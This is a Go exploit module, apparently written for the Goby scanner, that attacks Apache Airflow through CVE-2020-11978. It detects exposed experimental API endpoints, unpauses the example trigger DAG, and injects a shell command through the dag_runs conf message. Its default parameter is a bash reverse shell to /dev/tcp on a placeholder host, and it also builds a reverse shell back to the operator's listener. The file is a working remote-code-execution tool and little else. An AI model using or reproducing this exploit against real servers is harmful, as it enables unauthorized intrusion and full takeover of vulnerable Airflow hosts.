package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Airflow Example Dag RCE (CVE-2020-11978)",
    "Description": "An issue was found in Apache Airflow versions 1.10.10 and below. A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use). If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable.",
    "Impact": "Apache Airflow Example Dag RCE (CVE-2020-11978)",
    "Recommendation": "<p>1. Update version</p><p>2. Update the patch</p>",
    "Product": "APACHE-Airflow",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache Airflow 系统 Example Dags 文件命令执行漏洞 (CVE-2020-11978)",
            "Description": "<p>Airflow 是一个由社区创建的平台，用于以编程方式创作、安排和监控工作流。</p><p>攻击者可以利用此漏洞在服务器端任意执行代码、写入后门、获取服务器权限，然后控制整个web服务器。</p>",
            "Impact": "<p>攻击者可以利用此漏洞在服务器端任意执行代码、写入后门、获取服务器权限，然后控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://airflow.apache.org\">https://airflow.apache.org</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "APACHE-Airflow",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Apache Airflow Example Dag RCE (CVE-2020-11978)",
            "Description": "An issue was found in Apache Airflow versions 1.10.10 and below. A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use). If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable.",
            "Impact": "Apache Airflow Example Dag RCE (CVE-2020-11978)",
            "Recommendation": "<p>1. Update version</p><p><span style=\"color: var(--primaryFont-color);\">2. Update the patch</span></p>",
            "Product": "APACHE-Airflow",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"src=\\\"/static/pin_100.png\\\"\" && body=\"<span>Airflow</span>\")",
    "GobyQuery": "(body=\"src=\\\"/static/pin_100.png\\\"\" && body=\"<span>Airflow</span>\")",
    "Author": "李大壮",
    "Homepage": "https://airflow.apache.org/",
    "DisclosureDate": "2021-06-03",
    "References": [
        "https://gobies.org/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.8",
    "CVEIDs": [
        "CVE-2020-11978"
    ],
    "CNVD": [
        "CNVD-2020-42661"
    ],
    "CNNVD": [
        "CNNVD-202007-1187"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell,self_shell",
            "show": ""
        },
        {
            "name": "self_shell",
            "type": "input",
            "value": "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxx <&1",
            "show": "AttackType=self_shell"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "APACHE-Airflow"
        ],
        "Support": [],
        "Service": [
            "APACHE-Airflow"
        ],
        "System": [],
        "Hardware": []
    },
    "PocId": "10201"
}`

	bashTaskURL := "/api/experimental/dags/example_trigger_target_dag/tasks/bash_task"
	pausedURL := "/api/experimental/dags/example_trigger_target_dag/paused/false"
	dagURL := "/api/experimental/dags/example_trigger_target_dag/dag_runs"

	postPayload := func(u *httpclient.FixUrl, cmd string) bool {
		if resp, err := httpclient.SimpleGet(u.FixedHostInfo + pausedURL); err == nil && resp.StatusCode == 200 {
			cfg := httpclient.NewPostRequestConfig(dagURL)
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("Referer", u.FixedHostInfo)
			cfg.VerifyTls = false
			cfg.Data = fmt.Sprintf(`{"conf": {"message": "\"; %s #"}}`, cmd)
			resp, _ := httpclient.DoHttpRequest(u, cfg)
			return resp.StatusCode == 200
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + bashTaskURL); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "dag_run") {
					if resp, err := httpclient.SimpleGet(u.FixedHostInfo + pausedURL); err == nil && resp.StatusCode == 200 {
						return true
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if stepLogs.Params["AttackType"].(string) == "self_shell" {
				cmd := stepLogs.Params["self_shell"].(string)
				log.Println("use self shell :" + cmd)
				if !postPayload(expResult.HostInfo, cmd) {
					expResult.Output = "bash task timeout please try manually eg: https://github.com/pberba/CVE-2020-11978"
					expResult.Success = false
					return expResult
				}
				expResult.Output = "Please wait for the reverse shell on the remote machine or not try manually  eg: https://github.com/pberba/CVE-2020-11978"
				expResult.Success = true
				return expResult
			}
			waitSessionCh := make(chan string)
			expResult.Output = "bash task timeout please try self_shell and input cmd. or you can access https://github.com/pberba/CVE-2020-11978"
			if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
				log.Println("[WARNING] godclient bind failed", err)
			} else {
				cmd := godclient.ReverseTCPByBash(rp)
				log.Println("use goby shell :" + cmd)
				if !postPayload(expResult.HostInfo, cmd) {
					expResult.Output = "bash task timeout please try manually eg:https://github.com/pberba/CVE-2020-11978"
					expResult.Success = false
					return expResult
				}
				log.Println("task is send wait scheduler ...")
				select {
				case webConsleID := <-waitSessionCh:
					log.Println("[DEBUG] session created at:", webConsleID)
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 120):
				}
			}
			return expResult
		},
	))
}
